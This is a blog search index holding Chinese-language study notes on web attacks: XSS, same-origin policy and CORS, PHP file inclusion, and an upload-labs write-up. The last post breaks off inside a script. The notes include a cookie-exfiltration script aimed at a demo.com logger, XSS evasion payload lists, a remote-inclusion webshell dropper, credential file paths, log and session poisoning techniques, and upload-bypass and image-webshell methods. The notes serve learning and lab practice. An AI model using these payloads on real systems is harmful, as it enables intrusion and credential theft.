<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[XSS学习笔记]]></title>
    <url>%2F2020%2F05%2F03%2F2020-5-3-XSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[XSS学习笔记如题 XSS概述 跨站脚本攻击—XSS（Cross Site Script），是指攻击者通过在Web页面中写入恶意脚本，造成用户在浏览页面时，控制用户浏览器进行操作的攻击方式。假设，在一个服务端上，有一处功能使用了这段代码，他的功能是将用户输入的内容输出到页面上，很常见的一个功能。但是假如，这里输入的内容是一段经过构造的js。那么在用户再次访问这个页面时，就会获取使用js在用户的浏览器端执行一个弹窗操作。通过构造其他相应的代码，攻击者可以执行更具危害的操作。 XSS原理反射型XSS反射型XSS也叫非持久型XSS，最常见的就是在URL中构造，将恶意连接发送给目标用户。当用户访问该链接时，会向服务器发起一个GET请求来提交带有恶意代码的链接。 DVWA中的demo: &lt;?php if(!array_key_exists (&quot;name&quot;, $_GET) || $_GET[&#39;name&#39;] == NULL || $_GET[&#39;name&#39;] == &#39;&#39;){ $isempty = true; } else { echo &#39;&lt;pre&gt;&#39;; echo &#39;Hello &#39; . $_GET[&#39;name&#39;]; echo &#39;&lt;/pre&gt;&#39;; } 存储型XSS存储型XSS也叫持久型XSS，常见存在与博客的留言板、反馈投诉、论坛评论等地方，它会将恶意代码和正文都存储进服务器。用户每次访问页面都会触发恶意代码。 demo: &lt;?php if(isset($_POST[&#39;btnSign&#39;])) { $message = trim($_POST[&#39;mtxMessage&#39;]); $name = trim($_POST[&#39;txtName&#39;]); // Sanitize message input $message = stripslashes($message); $message = mysql_real_escape_string($message); // Sanitize name input $name = mysql_real_escape_string($name); $query = &quot;INSERT INTO guestbook (comment,name) VALUES (&#39;$message&#39;,&#39;$name&#39;);&quot;; $result = mysql_query($query) or die(&#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); } ?&gt; DOM型XSSDOM型XSS也是反射型的一种，不过比较特殊。它不会和服务器发生交互，它通过修改页面的DOM节点来形成XSS漏洞。我们可以通js脚本DOM进行编辑从而修改页面的元素。也就是说，客户端的脚本可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。 demo: &lt;script&gt; var img=document.createElement(&quot;img&quot;); img.src=&quot;http://demo.com/cookie?&quot;+escape(document.cookie); &lt;/script&gt; XSS危害 Cookie盗取 服务器端脚本： #http://demo.com/xss_cookie.php &lt;?php $cookie = $_GET[&#39;cookie&#39;]; $log = fopen(&quot;cookie.txt&quot;,&quot;a&quot;); fwrite($log, $cookie.&quot;\n&quot;) fclose($log); ?&gt; 在存在XSS漏洞的地方插入下面的代码: &lt;script&gt; var img = document.createElement(&quot;img&quot;); img.src = &quot;http://demo.com/xss_cookie.php?cookie=&quot;+escape(document.cookie); &lt;/script&gt; 钓鱼（伪造登录框页面） 获取内网IP段 参考这篇文章 https://toutiao.io/posts/8urlis/preview 站点重定向 获取客户端页面信息 XSS蠕虫 漏洞挖掘基本思路漏洞挖掘的方法大致可以分成两类： 人工挖掘 利用工具自动化挖掘 利用工具自动化挖掘本质就是将人工挖掘的流程自动化，流程还是差不多的。 一般流程： 寻找数据入口 潜在注入点检测 生成payload payload攻击验证 寻找数据入口就是寻找WEB页面上的输入和输出口。例如网站输入框、URL参数，评论、留言版、或者Header头部里的UA/Referer/Cookie等。潜在注入点检测就是判断输入点是否可以成功将数据注入到页面。生成payload就是不断测试去调整payload，用payload进行不断的fuzz。当payload成功注入时，就意味着XSS注入成功了。 常用的探测向量&lt;script&gt;alert(1)&lt;/script&gt; &lt;script&gt;confirm(1)&lt;/script&gt; &lt;img src=x onerror=prompt(1);&gt; &lt;svg/onload=prompt(1);&gt; &lt;audio src=x onerror=prompt(1);&gt; Awesome payloads&lt;A/hREf=&quot;j%0aavas%09cript%0a:%09con%0afirm%0d``&quot;&gt;z &lt;d3&quot;&lt;&quot;/onclick=&quot;1&gt;[confirm``]&quot;&lt;&quot;&gt;z &lt;d3/onmouseenter=[2].find(confirm)&gt;z &lt;details open ontoggle=confirm()&gt; &lt;script y=&quot;&gt;&lt;&quot;&gt;/*&lt;script* */prompt()&lt;/script &lt;w=&quot;/x=&quot;y&gt;&quot;/ondblclick=`&lt;`[confir\u006d``]&gt;z &lt;a href=&quot;javascript%26colon;alert(1)&quot;&gt;click &lt;a href=javas&amp;#99;ript:alert(1)&gt;click &lt;script/&quot;&lt;a&quot;/src=data:=&quot;.&lt;a,[8].some(confirm)&gt; &lt;svg/x=&quot;&gt;&quot;/onload=confirm()// &lt;--`&lt;img/src=` onerror=confirm``&gt; --!&gt; &lt;svg%0Aonload=%09((pro\u006dpt))()// &lt;sCript x&gt;(((confirm)))``&lt;/scRipt x&gt; &lt;svg &lt;/onload =&quot;1&gt; (_=prompt,_(1)) &quot;&quot;&gt; &lt;!--&gt;&lt;script src=//14.rs&gt; &lt;embed src=//14.rs&gt; &lt;script x=&quot;&gt;&quot; src=//15.rs&gt;&lt;/script&gt; &lt;!&#39;/*&quot;/*/&#39;/*/&quot;/*--&gt;&lt;/Script&gt;&lt;Image SrcSet=K */; OnError=confirm`1` //&gt; &lt;iframe/src \/\/onload = prompt(1) &lt;x oncut=alert()&gt;x &lt;svg onload=write()&gt; 一些速查表： Cross-site scripting (XSS) cheat sheet xss-payload-list XSS Filter Evasion Cheat Sheet Awesome XSS PolyglotXSS Polyglot也可以说是XSS通用攻击payload吧，它由不同语言的元素构成，能注入多种不同的上下文。 一个例子：from: https://github.com/s0md3v/AwesomeXSS#awesome-polyglots %0ajavascript:`/*\&quot;/*--&gt;&amp;lt;svg onload=&#39;/*&lt;/template&gt;&lt;/noembed&gt;&lt;/noscript&gt;&lt;/style&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;html onmouseover=&quot;/**/ alert()//&#39;&quot;&gt;` 解释： 常见的绕过方法 闭合标签：“&gt;&lt;script&gt;alert(1);&lt;/script&gt; 利用html标签的属性值：&lt;img src=&quot;javascript:alert(1);&quot;&gt; 空格/tab/回车:&lt;img src=&quot;java script:alert(1);&quot; &gt; 字符编码：%c1;alert(1);// 圆括号过滤：&lt;a onmouseover=&quot;javascript:window.onerror=alert;throw 1&quot;&gt; 实体解码 使用 十六进制、八进制、Unicode、HTML等进行编码 Alert被过滤：使用prompt和confirm代替 漏洞防御参照： https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html 最后推荐两个xss闯关网址： http://xss-quiz.int21h.jp/ https://www.xssgame.com/m4KKGHi2rVUN 等我有空就去玩一下 REFERENCE https://github.com/s0md3v/AwesomeXSS https://github.com/hongriSec/Web-Security-Attack/blob/master/Part1/Day2/files/README.md https://github.com/payloadbox/xss-payload-list https://owasp.org/www-community/xss-filter-evasion-cheatsheet https://thief.one/2017/05/31/1/ https://zhuanlan.zhihu.com/p/26086290 https://www.jianshu.com/p/13f0b9a15e46]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[同源策略与跨域资源共享]]></title>
    <url>%2F2020%2F05%2F02%2F2020-5-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%2F</url>
    <content type="text"><![CDATA[同源策略与跨域资源共享同源策略同源策略(Same Origin Policy, SOP) 是指在Web浏览器中，允许某个网页脚本访问另一个网页的数据，但前提是这两个网页必须有相同的URI、主机名和端口号，一旦两个网站满足上述条件，这两个网站就被认定为具有相同来源。此策略可防止某个网页上的恶意脚本通过该页面的文档对象模型访问另一网页上的敏感数据。 同源策略仅适用于脚本，这意味着一些网站可以通过相应的HTML标签来访问不同来源网站上的图片、CSS和动态加载脚本等资源，而跨站请求伪造就是利用同源策略不适用与HTML的缺陷。 同源的定义如果两个页面的协议，端口（如果有指定）和主机都相同，则两个页面具有相同的源。我们也可以把它称为“协议/主机/端口 tuple”，或简单地叫做“tuple”. (“tuple” ，“元”，是指一些事物组合在一起形成一个整体，比如（1，2）叫二元，（1，2，3）叫三元) 就URL来说，URL由协议、域名、端口和路径组成，如果两个URL的协议、域名和端口相同，则表示他们同源。 例子： 源的继承 在页面中通过 about:blank 或 javascript: URL 执行的脚本会继承打开该 URL 的文档的源，因为这些类型的 URLs 没有包含源服务器的相关信息。 例如，about:blank通常作为父脚本写入内容的新的空白弹出窗口的URL（例如用Window.open() 函数）。如果这个弹出窗口也包含JavaScript，则该脚本将从创建它的脚本那里继承对应的源 限制对象 Ajax通信 Cookie的读取 LocalStorage的读取 IndexDB的读取 DOM的操作 常见的跨域方法同源策略控制了不同源之间的交互， 例如在使用XMLHttpRequest 或 img标签时则会受到同源策略的约束。这些交互通常分为三类： 跨域写操作 跨域资源嵌入 跨域读操作 这三类操作中，只有跨域读操作一般是不被允许的。 跨域资源的嵌入具备src的HTML标签都是可以跨域的。 一些例子： 标签嵌入跨域脚本。语法错误信息只能被同源脚本中捕捉到。 标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域需要一个设置正确的 HTTP 头部 Content-Type ，不同浏览器有不同的限制。 通过 &lt;img&gt; 展示的图片 通过 &lt;video&gt;和&lt;audio&gt; 播放的多媒体资源。 通过&lt;script&gt;跨域加载脚本资源 通过 &lt;object&gt; 、&lt;applet&gt;和 &lt;embed&gt; 嵌入的插件。 通过 @font-face 引入的字体。一些浏览器允许跨域字体（ cross-origin fonts），一些需要同源字体（same-origin fonts）。 通过 iframe 载入的任何资源。站点可以使用 X-Frame-Options 消息头来阻止这种形式的跨域交互。 JSONP跨域JSONP基本思想：网页中添加一个&lt;script&gt;标签，向服务器请求JSON数据，服务器收到请求后，将数据放到一个指定名字的回调函数中传回来。JSONP是JSON with Padding的缩写，它只支持GET请求。 前端： &lt;script type=&quot;text/javascript&quot;&gt; function showdata(jsondata){ alert(jsondata); } &lt;/script&gt; &lt;script src=&quot;http://192.168.45.140/data.php?callback=showdata&quot;&gt;&lt;/script&gt; 上面的代码向服务器发起了GET请求，请求的查询字符串中的callback参数用于指定回调函数名字。 后端： &lt;?php $callback = $_GET[&#39;callback&#39;]; $data = array(&quot;test&quot;,&quot;123&quot;,&quot;abc&quot;); echo $callback.&#39;(&#39;.json_encode($data).&#39;)&#39;; document.domain脚本可以通过document.domain的值设置为其当前域或者其当前域的父域，这意味着相同主域名下的不同子域名的页面，可以通过设置这个值来让它们的域相同，从而实现跨域。 利用条件： 两个域名必须属于同一个一级域名 两者所用的协议和端口要相同 只需要在跨域的两个页面中设置document.domain就可以了。修改document.domain的方法只适用于不同子域的框架间的交互，需要载如iframe页面。 http://www.demo.com/a.html document.domain = &#39;demo.com&#39;; var ifr = document.createElement(&#39;iframe&#39;); ifr.src = &#39;http://script.demo.com/b.html&#39;; ifr.style.display = &#39;none&#39;; document.body.appendChild(ifr); ifr.onload = function(){ var doc = ifr.contentDocument || ifr.contentWindow.document; alert(doc.getElementsByTagName(&quot;h1&quot;)[0].childNodes[0].nodeValue); }; http://script.demo.com/b.html document.domain = &quot;demo.com&quot;; a.html通过创建一个iframe，去控制iframe的contentDocument，这样两个网页就可以进行交互了。 location.hashlocation.hash是 URL 跟在#后的字符串 例子： http://www.demo.com/index.html#Examples 其中location.hash就是”Examples” 将要传递的数据附在URL上，利用location.hash来进行传值。这种方法传递的数据长度是有限制的。 具体做法： 假设a.demo.com域名下的a.html想和b.demo.com域名下的b.html发生通信，a.html首先创建一个隐藏的iframe, iframe指向b.html，此时通过location.hash来传递参数给b.html 。但是由于同源策略限制，b.html无法返回数据，所以要找一个中间人，位于a.demo.com域名下的c.html，将返回的数据传给c.html。因为c.html和a.html是同源，所以可以通过c.html来将返回的数据传回给a.html，从而达到跨域的效果。 a.html代码： &lt;script&gt; function startRequest(){ var ifr = document.createElement(&#39;iframe&#39;); ifr.style.display = &#39;none&#39;; ifr.src = &#39;http://b.demo.com/b.html#hi&#39;; //传递的location.hash document.body.appendChild(ifr); } function checkHash() { try { var data = location.hash ? location.hash.substring(1) : &#39;&#39;; if (console.log) { console.log(&#39;Now the data is &#39;+data); } } catch(e) {}; } setInterval(checkHash, 2000); window.onload = startRequest; &lt;/script&gt; b.html代码： window.onload = function() { var ifr = document.createElement(&#39;iframe&#39;); ifr.style.display = &#39;none&#39;; var data = &quot;hello&quot; ifr.src = &#39;http://a.demo.com/c.html#&#39; + data; document.body.appendChild(ifr); } c.html代码： parent.parent.location.hash = self.location.hash.substring(1); window.name基本原理： indow对象有个name属性，该属性有个特征：即在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的。 具体实现参考这篇文章： https://www.cnblogs.com/rainman/archive/2011/02/21/1960044.html postMessage这个是HTML5新增的方法，用于安全的实现跨域通信。 语法： otherWindow.postMessage(message,targetOrigin,[ transfer]) otherWindow: 对接收信息页面的window的引用。可以是页面中iframe的contentWindow属性；window.open的返回值；通过name或下标从window.frames取到的值。 message: 所要发送的数据，string类型。 targetOrigin: 用于限制otherWindow，“*”表示不作限制 a.demo.com/a.html代码： &lt;iframe id=&quot;ifr&quot; src=&quot;b.demo.com/b.html&quot;&gt;&lt;/iframe&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload = function() { var ifr = document.getElementById(&#39;ifr&#39;); var targetOrigin = &#39;http://b.demo.com&#39;; ifr.contentWindow.postMessage(&#39;I was there!&#39;, targetOrigin); }; &lt;/script&gt; b.demo.com/b.html代码 &lt;script type=&quot;text/javascript&quot;&gt; window.addEventListener(&#39;message&#39;, function(event){ // 通过origin属性判断消息来源地址 if (event.origin == &#39;http://a.demo.com&#39;) { alert(event.data); // 弹出&quot;I was there!&quot; alert(event.source); // 对a.demo.com、a.html中window对象的引用 // 但由于同源策略，这里event.source不可以访问window对象 } }, false); &lt;/script&gt; CORSCORS是跨域资源共享，用于让网页的受限资源能被其他域名的网页访问的一种机制。 工作原理： 跨域资源共享标准描述了，新的HTTP头部在浏览器有权限的时候，应该以如何的形式发送请求到远程URLs。虽然服务器会有一些校验和认证，但是浏览器有责任去支持这些头部以及增加相关的限制。 对于能够修改数据的Ajax和HTTP请求方法（特别是 GET 以外的 HTTP 请求，或者搭配某些 MIME 类型的 POST 请求），浏览器必须首先使用 OPTIONS 方法发起一个预检请求（preflight request），从而获知服务端是否允许该跨源请求。服务器确认允许之后，才发起实际的 HTTP 请求。在预检请求的返回中，服务器端也可以通知客户端，是否需要携带身份凭证（包括 Cookies 和 HTTP 认证相关数据） 具体介绍参考： http://www.ruanyifeng.com/blog/2016/04/cors.html REFERENCE https://lightless.me/archives/review-SOP.html https://www.anquanke.com/post/id/86078 https://xz.aliyun.com/t/224#toc-2 https://www.cnblogs.com/rainman/archive/2011/02/20/1959325.html https://segmentfault.com/a/1190000000702539#item-5 https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy https://zh.wikipedia.org/wiki/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[文件包含漏洞]]></title>
    <url>%2F2020%2F04%2F28%2F2020-4-28-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[文件包含漏洞文件包含漏洞学习笔记 基本概念程序开发人员为了让代码更灵活，将被包含的文件设置为变量，然后通过文件包含函数去引入文件，这就是文件包含。 PHP中用于文件包含的函数用四个: require() require_once() include() include_once() include和require函数的区别是：include()在包含过程中如果出现错误，会抛出一个警告，程序继续执行，而require()出现错误时，会直接报错并退出程序。 require_once()和include_once()功能与require()和include()相同，但是如果一个文件被包含过了，那么require_once()和include_once()就不会再包含它，避免了函数重定义或变量重定义等问题。 当使用上面四个函数包含一个新文件时，会将这个文件内容当作PHP代码执行，PHP的内核不会关心被包含文件的类型。 漏洞形成原因在通过PHP函数引入文件时，传入的文件名没有经过合理的验证，从而导致用户可以操作预料外的文件，就可能导致文件泄露甚至恶意代码注入。 一个简单的demo: &lt;?php $file = $_GET[&#39;file&#39;]; @include(&quot;$file&quot;); ?&gt; 漏洞分类 本地文件包含LFI（Local File Inclusion） 也就是能打开并包含本地文件，一般遇到的文件包含漏洞都是本地文件包含漏洞。 远程文件包含RFI（Remote File Inclusion） 这个允许我们包含远程服务的文件并执行，需要对php.ini进行配置： allow_url_fopen = On （默认为On） allow_url_include = On （php5.2之后默认为Off） 只有两个配置项都为On时才能利用 文件包含利用包含上传文件文件包含函数会将被包含文件内容当作php代码去解析，可以通过网站的上传功能去上传一个图片马，然后通过文件包含去执行上传的webshell 读取敏感文件信息linux: /etc/passwd /etc/group /etc/shadow /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置 /usr/local/app/php5/lib/php.ini //PHP相关配置 /etc/httpd/conf/httpd.conf // Apache配置文件 /etc/my.conf // mysql 配置文件 windows c:\boot.ini // 查看系统版本 c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件 c:\windows\repair\sam // 存储Windows系统初次安装的密码 c:\ProgramFiles[mysql](https://cloud.tencent.com/product/cdb?from=10680)\my.ini // MySQL配置 c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码 c:\windows\php.ini // php 配置信息 可以参考这篇博客：https://www.cnblogs.com/v1vvwv/p/Sensitive-Information-Leakge.html 远程文件包含getshell在远程服务器创建shell.txt文件 &lt;?php fputs(fopen(&quot;../shell.php&quot;,&quot;w&quot;),&#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;);?&gt; 如果web应用存在远程文件包含漏洞，通过下面的url进行访问 http://www.demo1.com/index.php?file=http://www.demo2.com/shell.txt 那么就会在服务器目录下生成一个webshell，然后可以用webshell去操作了 包含environ文件原理：https://www.exploit-db.com/papers/12886 /proc/self/environ文件中有web进程运行时的环境变量，其中很多是用户能控制得，一般来说通过在User-Agent中注入php代码，然后包含/proc/self/environ来getshell。 /proc/self/environ文件一般通过目录遍历去访问，如下： ../../../../../../../../proc/self/environ 利用条件： php以cgi方式运行，这样environ才会保持UA头 environ文件可读 包含日志文件web服务器一般会将用户的访问记录保存在访问日志中，可以通过构造请求，将PHP代码插入日志文件中，然后通过文件包含漏洞来执行日志中的PHP代码 利用条件： 日志文件可读 知道日志文件存储目录 常包含的文件目录： /var/log/apache/access.log /var/log/apache/error.log /var/log/vsftpd.log /var/log/sshd.log /var/log/mail 一般情况下日志存储目录会被修改，需要读取服务器配置文件(httpd.conf / nginx.conf …..)或者根据phpinfo()的信息得到日志文件存储目录。同时日志记录的信息格式可能会被调整。 通常直接发起请求时不行的，会导致一些符号被编码无法正确解析，所以用bp抓包修改后发送请求。 包含SSH log ssh-log默认存储路径为：/var/log/auth.log poc: ssh “&lt;?php system(ls);?&gt;”@192.168.45.140 包含Session文件利用条件： 存在Session内的可控变量 Session文件可读写，并且知道存储路径 demo: &lt;?php session_start(); $username = $_GET[&#39;username&#39;]; $_SESSION[&#39;username&#39;] = $username; Session一般默认存储路径： /tmp /tmp/sessions /var/lib/php5 /var/lib/php7 Session文件命名格式：sess_[phpsessid] 其中phpsessid可以在cookie中找到，所以一般知道Session的存储路径就可以知道Session的完整路径了。 Session的存储目录在phpinfo()的信息中也有，有session.save_path控制。 往Session中写入PHP代码 确认Session文件名：sess_d296d6332474ac7bd3cff71728b6f646 通过文件包含Session执行PHP代码 php伪协议PHP提供了一些杂项输入/输出（IO）流，允许访问PHP的输入输出流、标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可操作的其他读取写入文件资源的过滤器。 一共有12个协议： file:// — 访问本地文件系统 http:// — 访问 HTTP(s) 网址 ftp:// — 访问 FTP(s) URLs php:// — 访问各个输入/输出流（I/O streams） zlib:// — 压缩流 data:// — 数据（RFC 2397） glob:// — 查找匹配的文件路径模式 phar:// — PHP 归档 ssh2:// — Secure Shell 2 rar:// — RAR ogg:// — 音频流 expect:// — 处理交互式的流 php://inputphp://input可以获取POST请求的原始数据的只读流。当它和包含函数结合时，php://input流会被当作php文件执行，从而导致任意代码执行。要注意的是在 enctype=”multipart/form-data” 的时候 php://input 是无效的 。 php://filterphp://filter是一种元封装器，设计用于数据流打开时的筛选过滤应用。 它使用以下的参数作为路径的一部分 名称 描述 resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。 read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（*\ *）分隔。 write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（*\ *）分隔。 &lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 php://filter可以获取指定文件源码，但是但它和包含函数结合时，php://filter流会被当作php文件执行，所以一般会对它进行编码，让它不执行，来实现任意文件读取。 poc: ?file=php://filter/read=convert.base64.encode/resource=phpinfo.php 利用条件: allow_url_fopen = On/Off allow_url_include = On/Off 常用的过滤器有两个：convert. 和 string. convert.* convert.* 过滤器的作用就和其名字一样。转换过滤器是 PHP 5.0.0 添加的. convert.base64-encode和 convert.base64-decode使用这两个过滤器等同于分别用 base64_encode()和 base64_decode()函数处理所有的流数据。 string.* 这个过滤器的作用是对字符进行各种转换，如加密、转换大小写等。 string.rot13（自 PHP 4.3.0 起）使用此过滤器等同于用 str_rot13()函数处理所有的流数据 。 string.toupper（自 PHP 5.0.0 起）使用此过滤器等同于用 strtoupper()函数处理所有的流数据 。 string.tolower（自 PHP 5.0.0 起）使用此过滤器等同于用 strtolower()函数处理所有的流数据。 zip://zip://可以访问压缩包里面的文件。当它和包含函数结合时，zip://流会被当作 php文件执行。它不在乎压缩包的后缀名，只要文件是zip的压缩包就行了。相同类型的协议还有zlib://和 bzip2:// poc: zip://[压缩包绝对路径]#[压缩包内文件] ?file=zip:///var/www/html/myzip.zip%23phpinfo.txt 利用条件： allow_url_fopen = On/Off allow_url_include = On/Off php &gt;= 5.2 phar://phar://类似与zip://，一样可以导致任意代码执行，但是phar://中可以使用相对路径。 poc: ?file=phar://myzip.zip/phpinfo.txt ?file=phar:///var/www/html/myzip.zip/phpinfo.txt 利用条件： allow_url_fopen = On/Off allow_url_include = On/Off php &gt;= 5.3 data://data://协议类似与php://input，可以让用户控制输入流，当它与包含函数结合时，用户输入的data://会被当作php文件执行。 poc: data://[&lt;MIME-type&gt;][;charset=&lt;encoding&gt;][;base64],&lt;data&gt; ?file=data://,&lt;?php phpinfo(); ?file=data://text/plain,&lt;?php phpinfo(); ?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw== ?file=data:text/plain,&lt;?php phpinfo(); ?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOw== 利用条件： allow_url_fopen = On allow_url_include = On php &gt; 5.2 最后来小结图： 绕过姿势前缀绕过目录遍历 通过使用../../返回上一目录，这一操作被称为目录遍历（Path Traversal）。例如：?file=../../phpinfo/phpinfo.php demo: &lt;?php $file = $_GET[&#39;file&#39;]; include &quot;/var/www/html/&quot;.$file; ?&gt; 当./\被过滤了怎么办，可以使用不同的编码来绕过服务器的waf防御 2e%2e%2f -&gt; ../ %2e%2e/ -&gt; ../ ..%2f -&gt; ../ %2e%2e%5c -&gt; ..\ %2e%2e%\ -&gt; ..\ ..%5c -&gt; ..\ %252e%252e%255c -&gt; ..\ ..%255c -&gt; ..\ 后缀绕过url格式：protocol://hostname[:port]/path[?query]#fragment 利用[?query]绕过 访问参数：?file=http://localhost:80/phpinfo.php? 拼接后： ?file=http://localhost:80/phpinfo.php?.txt 利用#fragment绕过 访问参数：?file=http://localhost:80/phpinfo.php%23 拼接后： ?file=http://localhost:80/phpinfo.php#.txt 00字符截断这个一般遇见的比较少，因为要求php版本&lt;=5.3.4 poc： ?file=phpinfo.php%00 超长字符截断linux下，目录字符串长度最大值为4096，windows的为256， 只要不断重复./ ， 则后缀在打到最大值时会被丢弃 poc： ?file=./././././……././shell.php 这个要求php版本&lt; 5.28 利用协议利用zip://和phar://协议，因为整个压缩包都是我们可控的，所以只要知道他们的后缀名，就可以自己构造 demo: &lt;?php $file = $_GET[&quot;file&quot;]; include $file.&quot;.txt&quot;; ?&gt; zip:// 访问参数 ?file=zip:///var/www/html/zip.jpg%23phpinfo 拼接后 ?file=zip:///var/www/html/zip.jpg#phpinfo.txt phar:// 访问参数 ?file=phar://zip.zip/phpinfo 拼接后 ?file=phar://zip.zip/phpinfo.txt 防御手段 allow_url_include和allow_url_fopen权限最小化 设置open_basedir（这个会将php能打开的文件限制在指定的目录树中） 白名单限制包含文件 严格过滤./\ REFERENCE https://www.anquanke.com/post/id/177491#h2-16 https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/ https://ca0y1h.top/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F https://zhuanlan.zhihu.com/p/49206578]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[upload_labs writeup]]></title>
    <url>%2F2020%2F04%2F26%2F2020-4-26-upload_labs-writeup%2F</url>
    <content type="text"><![CDATA[upload_labs writeup环境是windows，这里我用了他提供的集成环境，注意要修改apache的配置文件，因为他里面的路径和自己本地的不同，如果不修改的话apache会一直启动不来。 Pass-01这一关是客户端使用js对上传的文件后缀名进行校验，通过抓包修改就可以上传了，也可以禁用浏览器的js。 Pass-02抓包，修改Content-Type为image/gif Pass-03利用windows操作系统特性，上传不符合wnidows文件命名规则的文件 shell.php%81 这里的%81需要在bp里进行urldecode 查了下，发现我的做法和别人的不一样….. 原来是我环境有点问题 正常做法应该是传扩展名为php3、phtml等来绕过黑名单 Pass-04这一关也是一个个黑名单过滤，但是它的黑名单比上一关全很多，测试了一下，它基本把能过滤的都过滤了，但是它没有过滤.htaccess。 可以上传一个.htaccess文件，内容为： SetHandler application/x-httpd-php 然后上传一个图片马，成功连接。 这一关用上一关的思路也是可以的，构造不符合windows的文件后缀名 shell.php%81 ==&gt; shell.php Pass-05测试了一下，这一关也是黑名单过滤，它把.htaccess也过滤了。可以用后缀名大小写绕过。 Pass-06扩展名后加空格绕过，或者加[%81-90]也可以绕过 shell.php[空格] shell.php[%81-90] Pass-07扩展名后加.绕过 shell.php. Pass-08利用windows文件流特性绕过 shell.php::$DATA Pass-09后缀名加. .绕过，或者利用windows文件名特性绕过，后缀名加[%81-90] shell.php. . shell.php[%81-90] Pass-10双写php绕过 shell.pphphp Pass-11测试了一下，发现这个是白名单过滤，只允许上传.jpg|.png|.gif类型的文件 同时它文件保存的路径可以通过参数save_path控制，因为php版本小于5.3.4，存在%00截断问题。 控制save_path参数为../upload/shell.php%00，上传文件名为shell.jpg Pass-12文件保存路径可控，这一关和上一关的区别是save_path是通过POST请求传递的，所以%00要先进行一遍url解码，因为POST请回会对数据进行url编码。 Pass-13这一关要上传.jpg|.gif|.png的图片马上去，然后通过文件包含漏洞去运行图片马。它对文件头前两个字节进行了检测，通过文件头判断是否是.jpg|.gif|.png。 在一句话木马前加上对应的文件头，然后上传上去就ok了 .gif .jpg .png Pass-14这一关也是上传图片马，它通过getimagesize()函数来检查图片类型。 getimagesize()函数通过检查文件头来判断文件类型，所以只要构造好文件头就可以了。 Pass-15这一关使用了exif_imagetype函数来判断图像类型，这个函数通过读取 图像的第一个字节来判断图片类型。只要加上对应的文件头就可以绕过了，思路和前两关都一样。 Pass-16这一关对上传的图片内容做了二次渲染。它将原本属于图片数据的部分提取了出来，再用自己的API或者函数进行渲染。通常php使用的是GD库，但是也可以绕过。基本方法是通过对比处理前和处理后的图片数据，找出没未经处理的数据区域，然后将代码插入。 gif 将上传后的文件下下来，用010editor打开，找到未被修改的区域将代码写入。 png 有两种方法，一种是将webshell写如PLTE数据块，另一种是写入IDAT数据块，具体制作方法参考这篇文章:http://0verflow.cn/?p=1502 jpg 用大佬写的脚本制作图片马 &lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;. If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = &#39;&lt;?php phpinfo();?&gt;&#39;; if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) { die(&#39;php-gd is not installed&#39;); } if(!isset($argv[1])) { die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;); } set_error_handler(&quot;custom_error_handler&quot;); for($pad = 0; $pad &lt; 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) { die(&#39;Incorrect SOI marker&#39;); } while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) { $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) { 